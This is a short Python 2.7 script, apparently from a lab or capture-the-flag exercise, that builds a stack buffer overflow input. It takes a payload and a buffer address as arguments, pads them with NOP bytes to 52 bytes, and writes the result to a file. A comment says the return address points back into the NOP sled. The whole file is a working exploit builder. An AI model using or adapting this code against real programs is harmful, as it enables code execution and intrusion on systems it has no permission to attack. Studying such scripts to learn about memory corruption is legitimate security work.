#!/usr/bin/python2.7

import sys
payload = sys.argv[1]
bufferAddress = sys.argv[2]

nops = '\x90' * (52-len(payload) - len(bufferAddress))
# returnAddress points back in the middle of our no op padding
exploit = payload + nops + bufferAddress

f = open('exploitInputFile', 'wb')
f.write(exploit)
f.write('\n')
f.close()